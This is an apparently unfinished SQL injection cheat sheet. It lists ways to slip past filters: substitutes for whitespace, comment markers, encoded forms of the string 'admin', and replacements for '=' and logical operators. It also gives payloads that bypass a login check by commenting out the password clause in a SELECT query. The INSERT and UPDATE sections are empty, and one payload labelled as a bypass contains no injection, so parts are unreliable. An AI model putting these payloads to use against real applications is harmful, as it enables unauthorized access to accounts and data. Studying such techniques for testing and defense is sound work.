# Cheat Sheet

## # Filter Bypass

### White Space

* /\*\*/&#x20;
* ()
* \+
* \t = %09&#x20;
* \n = %0a

### Comment

* \--
* \#
* /\*\*/

### admin

* reverse("nimda")
* 0x61646d696e
* char(97, 100, 109, 105, 110)
* 0b0110000101100100011011010110100101101110

### =&#x20;

* LIKE
* IN
* REGEXP
* RLIKE
* SOUNDS LIKE

### and, or, not

* ||
* &&
* %26%26 (&&)
* %7c%7c (||)&#x20;
* !



## # SELECT

```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}';
```

### Payload

```sql
/* No filter */
SELECT * FROM users WHERE username='admin'# AND password='{password}';

/* lowercase */
SELECT * FROM users WHERE username='Admin'# AND password='{password}';
SELECT * FROM users WHERE username='Admin'-- AND password='{password}';

/* lowercase */
SELECT * FROM users WHERE username='Admin' AND password='{password}';




```







## # INSERT

```sql
INSERT INTO users VALUES 
```



## # UPDATE

